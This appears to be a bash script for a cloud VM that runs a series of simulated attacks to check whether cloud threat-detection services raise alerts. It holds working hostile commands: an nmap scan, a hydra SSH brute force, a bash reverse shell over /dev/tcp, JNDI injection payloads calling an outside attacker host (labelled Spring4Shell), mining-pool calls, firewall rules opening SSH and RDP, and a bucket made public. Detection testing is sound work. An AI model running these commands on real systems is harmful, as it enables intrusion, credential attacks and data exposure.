#!/bin/bash
#Attack

exec 3>&1 4>&2
trap 'exec 2>&4 1>&3' 0 1 2 3
exec 1>log.txt 2>&1

SETUPCOMPLETE="/var/log/setupcomplete.log"
if [[ ! -f $SETUPCOMPLETE ]]; then
	#FirstRun
	export PROMPT_COMMAND='echo -n "hostname $(date +'%y-%m-%d-%H:%M:%S:%N')"'
    	sudo apt-get remove --purge man-db -y
	sudo apt-get update && sudo apt-get install nmap -y
	#sudo apt-get update && sudo apt-get install google-cloud-cli -y
	sudo apt-get update && sudo apt-get install netcat -y
	sudo apt-get update && sudo apt-get install hydra -y
	sudo apt-get update && sudo apt-get install net-tools -y
	sudo apt-get update && sudo apt-get install dnsutils -y

	gcloud storage cp gs://plat-g-data-store/dns-exfil.txt /usr/share/wordlists/dns-exfil.txt 
	gcloud storage cp gs://plat-g-data-store/limitedwordlist.txt /usr/share/wordlists/limitedwordlist.txt
	gcloud storage cp gs://plat-g-data-store/logcron.sh /usr/share/logcron.sh

	# Add Docker's official GPG key:
	#sudo apt-get update
	#sudo apt-get install ca-certificates curl
	#sudo install -m 0755 -d /etc/apt/keyrings
	#sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
	#sudo chmod a+r /etc/apt/keyrings/docker.asc
	#echo \
	#  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
	#  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
	#  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
	#sudo apt-get update
	#sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y

#the next line creates an empty file so it won't run the next boot
   sudo touch "$SETUPCOMPLETE"
   
	cp log.txt /var/log/gcp-fr.log
	gcloud storage cp /var/log/gcp-fr.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
	mv /var/log/gcp-fr.log /var/log/fr-gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt 
 	#shutdown
else
   echo "Testing Run"
   curl ifconfig.io 
sleep 180
# 1 - AWS simulate internal recon and attempted lateral movement #google cannnot detect
echo "start test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
sudo nmap -sT 10.1.1.3/
echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 3 SSH - Google says 
echo "start test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
hydra -f -l userattack -P /usr/share/wordlists/limitedwordlist.txt 10.1.1.3 -t 4 ssh
echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 4 Calling bitcoin wallets to download mining toolkits
echo "start test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
echo "stop test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

#5 Calling large numbers of large domains to simulate tunneling via DNS
echo "start test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
sudo dig -f /usr/share/wordlists/dns-exfil.txt  > /dev/null &
echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 6 - AWS PrivilegeEscalation:Runtime/DockerSocketAccessed
echo "start test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
sudo bash -c 'nc -lU /var/run/docker.sock &'
sudo echo SocketAccessed | nc -w5 -U /var/run/docker.sock
echo "stop test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 7 - AWS PrivilegeEscalation:Runtime/RuncContainerEscape
echo "start test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
sudo touch /bin/runc
sudo echo "Runc Container Escape" > /bin/runc
echo "stop test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 8 - AWS PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified
echo "start test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
sudo touch /tmp/release_agent
sudo echo "Release Agent Modified" > /tmp/release_agent
echo "stop test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

# 9 - Execution:Runtime/ReverseShell
echo "start test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
timeout 5s nc -nlp 13317 &
sleep 10
bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
exec "$@"
echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

#15 - 3.xx - Firewall rules modified to open SSH
echo "start test 15 ssh w" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
gcloud compute firewall-rules create allowssh-$HOSTNAME \
--allow=tcp:22 \
--description="Allow incoming traffic on TCP port 22" \
--direction=INGRESS \
--target-tags=bitbucket \
--network=plat-g-w-sccp-us-east1 \
--project=plat-g-w-sccp
echo "stop test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
echo "start test 15 ssh wo" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
gcloud compute firewall-rules create allowssh-$HOSTNAME \
--allow=tcp:22 \
--description="Allow incoming traffic on TCP port 22" \
--direction=INGRESS \
--target-tags=bitbucket \
--network=plat-g-wo-sccp-us-east1 \
--project=plat-g-wo-sccp
echo "stop test 15" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

#16 - 3.xx - Firewall rules modified to open RDP
echo "start test 16 rdp w" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
gcloud compute firewall-rules create allowrdp-$HOSTNAME \
--allow=tcp:3389 \
--description="Allow incoming traffic on TCP port 3389" \
--direction=INGRESS \
--target-tags=bitbucket \
--network=plat-g-w-sccp-us-east1 \
--project=plat-g-w-sccp
echo "stop test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
echo "start test 16 rdp wo" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
gcloud compute firewall-rules create allowrdp-$HOSTNAME \
--allow=tcp:3389 \
--description="Allow incoming traffic on TCP port 3389" \
--direction=INGRESS \
--target-tags=bitbucket \
--network=plat-g-wo-sccp-us-east1 \
--project=plat-g-wo-sccp
echo "stop test 16" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

#17 - 6.23 - Spring4Shell vulnerability exploit attempts (CVE-2022-22965)
echo "start test 17 - ldap" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:ldap://attack.retep.ca:666/test}
echo "start test 17 - rmi" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:rmi://attack.retep.ca:666/test}
echo "start test 17 - DNS" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:dns://attack.retep.ca:666/test}
echo "stop test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')

gcloud storage objects update gs://plat-g-data-store/stuff.txt --add-acl-grant=entity=AllUsers,role=READER

#lets export out logs 
cp log.txt /var/log/gcp.log
gcloud storage cp /var/log/gcp.log gs://plat-g-data-store/logging/"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt &>> /var/log/gcloud.txt
mv /var/log/gcp.log /var/log/gcp-"$HOSTNAME-$(date +%y-%m-%d-%H:%M:%S:%N)".txt 

sleep 180

#Cleanup time
gcloud compute firewall-rules delete allowssh-$HOSTNAME -q --project=plat-g-w-sccp
gcloud compute firewall-rules delete allowrdp-$HOSTNAME -q --project=plat-g-w-sccp
gcloud compute firewall-rules delete allowssh-$HOSTNAME -q --project=plat-g-wo-sccp
gcloud compute firewall-rules delete allowrdp-$HOSTNAME -q --project=plat-g-wo-sccp

sleep 180
shutdown

fi
